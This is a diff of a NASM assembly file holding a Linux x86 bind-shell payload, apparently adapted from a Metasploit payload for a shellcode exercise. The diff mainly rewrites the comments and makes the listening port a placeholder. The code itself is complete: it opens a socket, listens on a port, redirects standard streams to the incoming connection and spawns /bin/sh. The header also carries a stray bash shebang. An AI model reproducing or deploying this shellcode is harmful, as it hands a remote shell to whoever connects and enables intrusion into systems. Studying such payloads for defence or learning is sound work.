@@ -1,42 +1,39 @@
-; Bind_Shell.nasm
-; NASM code obtain from: msfvenom -p linux/x86/shell_bind_tcp LPORT=* EXITFUNC=THREAD -f raw | ndisasm -u -
-; Author: MrSquid
+#!/bin/bash
+#Filename: schema.nasm
+#Author:  MrSquid
+#Purpose: Bindshell.nasm code with port easily configurable 
 
-
-
-global _start ;Para definir donde arranca 
+global _start  
 
 section .text
 
-_start:         ;Usamos como referencia bind_shell.py
+_start:
 	;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	;
-	; 
-	xor ebx,ebx
-	mul ebx
-	push ebx
-	inc ebx
-	push ebx
-	push byte +0x2
-	mov ecx,esp
-	mov al,0x66
-	int 0x80
+	xor ebx,ebx ;Clearing out ebx
+	mul ebx ; 
+	push ebx ;push ebx to the stack 
+	inc ebx ;increment in 1 ebx
+	push ebx ; push ebx again to the stack
+	push byte +0x2 ; Push 2 to the stack 
+	mov ecx,esp ; 2 is set to ecx
+	mov al,0x66 ; 102 is set to al 
+	int 0x80 ;socket is executed --> eax
 	
 	;s.bind(('', port)) 
 	pop ebx
 	pop esi
 	push edx
-	push dword PORT ;Aqui esta metiendo el puerto 
+	push dword PORT ;Port selected to be used (replaced with the hexadecimal value of the port number) 
 	push dword 0002
 	push byte +0x10
 	push ecx
 	push eax
 	mov ecx,esp
-	push byte +0x66 ;Aqui llama a socketcall (man 2 socketcall)
+	push byte +0x66 
 	pop eax
-	int 0x80
+	int 0x80 ;socketcall is called 
 
-	;s.listen(1)
+	;s.listen(1) 
 	mov [ecx+0x4],eax
 	mov bl,0x4
 	mov al,0x66
@@ -51,14 +48,12 @@ _start:         ;Usamos como referencia bind_shell.py
 	dup:
 		push byte +0x3f ;63 en entero
 		pop eax
-		;os.dup2(rem.fileno(),0) #Aqui redirige STDIN,STOUD and STDERR hacia la consolo abierta via TCP
+		;os.dup2(rem.fileno(),0) #STDIN,STOUT,STDERR redirection 
 	    	;os.dup2(rem.fileno(),1)
 	    	;os.dup2(rem.fileno(),2)
 		int 0x80
 		dec ecx
 		jns dup
-
-	;pty.spawn("/bin/bash") #Ejecuta la shell
 
 	push dword 0x68732f2f ;pty.spawn("/bin/bash")
 	push dword 0x6e69622f
@@ -67,5 +62,5 @@ _start:         ;Usamos como referencia bind_shell.py
 	push ebx
 	mov ecx,esp
 	mov al,0xb
-	int 0x80
+	int 0x80 ;Shell is executed 
 
